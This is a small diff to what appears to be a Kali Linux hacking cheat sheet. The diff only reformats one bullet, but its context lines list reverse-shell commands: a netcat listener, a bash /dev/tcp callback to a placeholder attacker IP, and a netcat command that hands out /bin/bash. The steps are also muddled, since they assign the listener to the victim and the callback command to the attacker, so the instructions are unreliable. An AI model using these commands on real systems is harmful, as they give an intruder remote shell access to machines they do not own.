@@ -32,7 +32,7 @@ Recommended OS: Kali Linux
 - **Reverse Shell**:  
   1. Victim opens port:  `nc -lvp 4444`  
   2. Attacker:  `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`
-  Note: newer systems use `nc -l -p 1234 -e /bin/bash`  
+  - Note: newer systems use `nc -l -p 1234 -e /bin/bash`  
 
 ---
 
